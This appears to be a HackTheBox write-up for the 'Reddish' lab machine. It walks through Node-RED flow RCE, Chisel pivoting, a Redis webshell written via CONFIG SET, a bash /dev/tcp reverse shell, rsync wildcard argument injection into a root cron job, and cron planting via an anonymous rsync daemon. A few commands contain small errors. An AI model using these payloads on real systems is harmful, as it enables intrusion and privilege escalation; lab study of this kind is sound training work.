---
title: "HTB - Reddish (Insane | Linux | Web)"
date: 2026-10-07 12:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, linux, node-red, pivoting, chisel, redis, rsync, docker, webshell, cron-job]
description: "Node-RED flow RCE for a foothold, pivot across Docker networks with Chisel, Redis unauthenticated RCE via RDB webshell overwrite, an rsync wildcard cron-job injection, then anonymous rsync arbitrary file write to root"
image:
  path: /assets/img/reddish.png
---


## Recon

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.48 seconds
```

### Service Discovery Analysis

Nmap reveals that only TCP port 1880 is open, which has been identified as Node.js Express Framework. Port 1880 is the well-known default for **Node-RED**, a browser-based flow editor for wiring together IoT/automation logic — it runs on Express under the hood, which matches the fingerprint. Node-RED's admin UI, when left unauthenticated, is a direct path to remote code execution: its "function" and "exec" nodes let an authenticated (or in this case, unauthenticated) user run arbitrary JavaScript or shell commands as part of a deployed flow.

![](/assets/img/reddish/Pasted_image_20261008082519.png)

---

## User

If we change the request to POST we'll see the following:

![](/assets/img/reddish/Pasted_image_20261008083335.png)

path + id, and if we go to that directory we'll find the following:

![](/assets/img/reddish/Pasted_image_20261008083417.png)

The editor has items grouped as "input", "output", "function", "social", "storage", "analysis", and "advanced". Clicking on any given item will load a description of the item in the panel on the right.

### Node-RED Flow RCE

**Overview**

Node-RED flows are visual pipelines of nodes an authenticated editor user can wire together and deploy. Several built-in node types — most notably `exec` and `function` — execute arbitrary shell commands or JavaScript on the server when a flow runs. When the Node-RED admin interface (normally served on `/`, with the API under `/flows`) has no authentication configured, anyone who can reach it can import a malicious flow containing one of these nodes, deploy it, and get code execution on the host running Node-RED — exactly as if they had a shell on the server already.

We're going to download **[Node-Red-Reverse-Shell](https://github.com/valkyrix/Node-Red-Reverse-Shell)**

```bash
git clone https://github.com/valkyrix/Node-Red-Reverse-Shell.git
cd Node-Red-Reverse-Shell
```

Then in the json file, we modify it and put our ip and port, then copy it.

![](/assets/img/reddish/Pasted_image_20261008091050.png)

Then on the page we go to the three lines, Import -> Clipboard and paste the json with our ip

![](/assets/img/reddish/Pasted_image_20261008091133.png)

Then we listen with netcat

```bash
nc -lnvp 4444
```

And we click DEPLOY.

![](/assets/img/reddish/Pasted_image_20261008091238.png)

![](/assets/img/reddish/Pasted_image_20261008091249.png)

We receive a shell. Now we'll use a reverse shell for better comfort in the shell, with a perl payload.

![](/assets/img/reddish/Pasted_image_20261008091619.png)

OpenSSL is available and can be used to scan commonly used ports on the identified hosts.

```bash
for host in 1 2 3 4; do for port in 21 22 25 80 443 8080; do echo 172.19.0.$host:$port & openssl s_client -connect 172.19.0.$host:$port 2>/dev/null | grep CONNECTED; done; done
```

![](/assets/img/reddish/Pasted_image_20261008092058.png)

This reveals that port 80 on 172.19.0.3 is accessible.

### Tunnel with Chisel

**Overview**

Chisel is a TCP tunneling tool that runs a client/server pair over a single HTTP connection. In a Docker-segmented environment like this one — where the box we landed on (Node-RED) sits in a different internal network than other containers (172.19.0.x) — chisel lets us "pivot": we bring up a server on our attacker machine, connect a client from the compromised host, and open reverse tunnels that make internal-only services (reachable only from inside the Docker network) available on our own loopback, as if they were running locally.

```bash
# Attacker Machine
curl https://i.jpillora.com/chisel! | bash
cp /usr/local/bin/chisel .
nc -lvnp 80 < chisel
```

```bash
# Victim Machine
cd /tmp
cat < /dev/tcp/10.10.16.65/80 > chisel
chmod 755 /var/tmp/chisel
```

```bash
# Attacker Machine
/usr/local/bin/chisel server -p 8002 -reverse -v

# Victim Machine
./chisel client 10.10.16.65:8002 R:127.0.0.1:8001:172.19.0.3:80
```

After navigating to the web page, the source code is inspected, which reveals several functions

![](/assets/img/reddish/Pasted_image_20261008095951.png)

The developer has made the web folder accessible to a database container (presumed to be 172.19.0.2).

```bash
for port in $(seq 1 65535); do (echo reddish > /dev/tcp/172.19.0.2/$port && echo $port) 2> /dev/null; done
```

![](/assets/img/reddish/Pasted_image_20261008100205.png)

This port is commonly associated with "Redis", an open-source in-memory project that provides database, caching and message broker services. The developer of Redis (@antirez) reveals how it is possible to exploit "unprotected by default" Redis instances, and what steps can be taken to secure Redis if required.

### Lateral Movement to 172.19.0.3

Another tunnel is created on 172.19.0.4, in order to make Redis accessible remotely

```bash
./chisel client 10.10.16.65:8002 R:127.0.0.1:8001:172.19.0.3:80 R:127.0.0.1:6379:172.19.0.2:6379
```

### Redis Unauthenticated RCE (Webshell via RDB Overwrite)

**Overview**

Redis, by default, binds without any authentication and allows any connected client to run administrative commands — including `CONFIG SET`, which controls where and under what filename Redis persists its in-memory data (the RDB snapshot). By setting a key's value to PHP code, then pointing `dbfilename` and `dir` at the web server's document root with a `.php` extension, a `SAVE` command writes that "database dump" to disk as a working PHP web shell. Since Redis has no concept of file-type validation, it will happily save arbitrary attacker-controlled bytes to any path the Redis process has write access to — turning an open database into remote code execution on whatever application shares that filesystem.

We enter redis and plant our web shell.

```bash
redis-cli -h 127.0.0.1 -p 6379
flushall
OK
set access "<? system($_REQUEST['cmd']); ?>"
OK
config set dbfilename FVEVETEWBE.php
OK
config set dir /var/www/html/
OK
save
OK
```

![](/assets/img/reddish/Pasted_image_20261008100630.png)

Then we test the webshell and see that it works.

![](/assets/img/reddish/Pasted_image_20261008100915.png)

Now we can try to make a reverse shell. For that we need to redirect to our listener — the following chisel command adds a third forwarding rule on top of the two we already have (for the web app and for Redis). Unlike the first two (`R:...`), this third rule has no `R:` prefix, which flips its direction: instead of exposing a remote service on our own loopback, it opens a listening port (9002) on the pivot host itself (172.19.0.4) and tunnels any connection made to it back through chisel to our attacker machine's `127.0.0.1:8005`. In other words, it turns the pivot host into a relay point the victim's reverse shell payload can connect to locally, which chisel then forwards all the way back to our netcat listener — necessary because the web shell's host (172.19.0.3) can't reach our attacker IP directly due to the Docker network segmentation.

```bash
# Victim Machine
./chisel client 10.10.16.65:8002 R:127.0.0.1:8001:172.19.0.3:80 R:127.0.0.1:6379:172.19.0.2:6379 9002:127.0.0.1:8005
```

We listen on port 8005

```bash
nc -lnvp 8005
```

We execute the payload in the web shell

```bash
# payload
?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/172.19.0.4/9002+0>%261"
```

![](/assets/img/reddish/Pasted_image_20261008104916.png)

A reverse shell from 172.19.0.3 running as www-data is received.

We enumerate the crontabs

![](/assets/img/reddish/Pasted_image_20261008111141.png)

The job executes /backup/backup.sh as root. Examination of this shell script reveals local *.rdb files are transferred to the host "backup" from a folder owned by www-data, before restoring the local contents of /var/www/html from a previous backup to this host. Of note, rsync is used to transfer the files, and the cron rsync command makes use of wildcards. If rsync processes a file which includes the "-e" parameter, command execution can be achieved

### Exploitation of Cron Job (rsync Wildcard Argument Injection)

**Overview**

When a shell script invokes `rsync` with a wildcard (e.g. `rsync * user@host:dest`), the shell expands that wildcard into a literal list of filenames _before_ rsync ever sees them. If an attacker can create a file in that directory whose name itself looks like an rsync command-line flag — such as `-e sh somefile` — the shell will pass `-e sh somefile` to rsync as if it were a legitimate argument. rsync's `-e` flag specifies the remote shell command to use for the connection, so by naming a file `-e sh reddish.rdb`, we trick the root-run rsync invocation into executing `sh reddish.rdb` instead of just transferring a file — achieving arbitrary command execution as whichever user the cron job runs as (root, in this case).

```bash
# The file "reddish.rdb" is created locally with the contents below.

#!/bin/sh 
cp /bin/dash /var/tmp/privesc 
chmod 4755 /var/tmp/privesc
```

```bash
# This is base64 transferred to 172.19.0.3.
base64 -w 0 reddish.rdb IyEvYmluL3NoCmNwIC9iaW4vZGFzaCAvdmFyL3RtcC9wcml2ZXNjCmNobW9kIDQ3NTUgL3Zhci90bXAvcHJ pdmVzYwo=

cd /var/tmp echo IyEvYmluL3NoCmNwIC9iaW4vZGFzaCAvdmFyL3RtcC9wcml2ZXNjCmNobW9kIDQ3NTUgL3Zhci90bXAvcHJpdmVzYwo= | base64 -d -w 0 > reddish.rdb
```

The file "-e sh reddish.rdb" is created in the www-data owned subdirectory.

```bash
cd /var/www/html; ls 
cd f187a0ec71ce99642e4f0afbd441a68b/ 
touch -- '-e sh reddish.rdb' 
mv /var/tmp/reddish.rdb .
```

The root owned setuid binary "/var/tmp/privesc" is created and it is possible to execute commands as root. It can now be confirmed that the host "backup" has IP Address 172.20.0.2

![](/assets/img/reddish/Pasted_image_20261008111941.png)

We capture the user.txt found at **/home/somaro**

---

## Root

### Exploitation of rsync Arbitrary File Write (Anonymous rsync Daemon)

**Overview**

rsync can also run as a standalone daemon (distinct from the rsync-over-SSH setup abused above), serving one or more named "modules" — directories exposed for sync. When a module is configured without a password, any client that can reach the daemon's port can read from or write to that module's filesystem path with whatever privileges the daemon process has. Here, the `backup` host (172.20.0.2) runs an anonymous, writable rsync daemon as root, which means we can push arbitrary files — including a malicious cron job — directly into its filesystem and have root execute it on schedule.

rsync has been configured such that a password is not required. This allows for any file to be read or written, as root on 172.20.0.2. We'll make a script that orders **Reddish (`<target>`)** to extract the root flag on its next automatic execution:

```bash
echo "* * * * * root mkdir -p /tmp/host_root && mount /dev/sda2 /tmp/host_root && cp /tmp/host_root/root/root.txt /etc/cron.d/final_flag.txt && chmod 644 /etc/cron.d/final_flag.txt" > /tmp/evil_cron
```

Now we send that command directly to **Reddish (`<target>`)**'s task folder using the working rsync command:

```bash
rsync -av /tmp/evil_cron rsync://172.20.0.2/src/etc/cron.d/task_backup
```

We wait a minute. Once that time passes, we run this command to **bring the root flag directly to our screen**:

```bash
rsync -av rsync://172.20.0.2/src/etc/cron.d/final_flag.txt /tmp/root.txt && cat /tmp/root.txt
```

![](/assets/img/reddish/Pasted_image_20261008113403.png)

---

### Summary

**Attack Chain:**

1. **Node-RED Discovery** → Fingerprinted an unauthenticated Node-RED instance on port 1880 via Nmap's Express detection
2. **Node-RED Flow RCE** → Imported a malicious flow (Node-Red-Reverse-Shell) containing an `exec`/`function` node, deployed it, caught a reverse shell
3. **Internal Network Scanning** → Used an OpenSSL-based port scan loop to enumerate other Docker containers on the internal `172.19.0.x` network, finding an accessible web service on `172.19.0.3`
4. **Chisel Pivoting** → Transferred the chisel binary via raw `/dev/tcp` and netcat (no outbound HTTP needed), established a reverse tunnel to expose `172.19.0.3:80` locally
5. **Redis Discovery** → Port-scanned `172.19.0.2` from the compromised host, identified an exposed Redis instance
6. **Redis Unauthenticated RCE** → Tunneled Redis through chisel, used `CONFIG SET`/`SAVE` to write a PHP web shell into the web root of `172.19.0.3`
7. **Reverse Shell via Pivot Relay** → Added a third chisel forwarding rule turning `172.19.0.4` into a relay, triggered the web shell to connect back through it, landed a www-data shell
8. **Cron Enumeration** → Found a root cron job running a backup script that rsyncs `.rdb` files with wildcard expansion
9. **rsync Wildcard Argument Injection** → Planted a file named `-e sh reddish.rdb` to hijack the cron's rsync invocation into executing arbitrary code as root, used it to create a SUID shell, captured user.txt
10. **Anonymous rsync Daemon Abuse** → Identified a password-less, writable rsync daemon on a third host (`backup`, 172.20.0.2) running as root
11. **Scheduled Task Injection** → Wrote a malicious cron job into the daemon's exposed filesystem that mounts the host disk and copies root.txt to a readable location, retrieved it moments later via the same rsync daemon


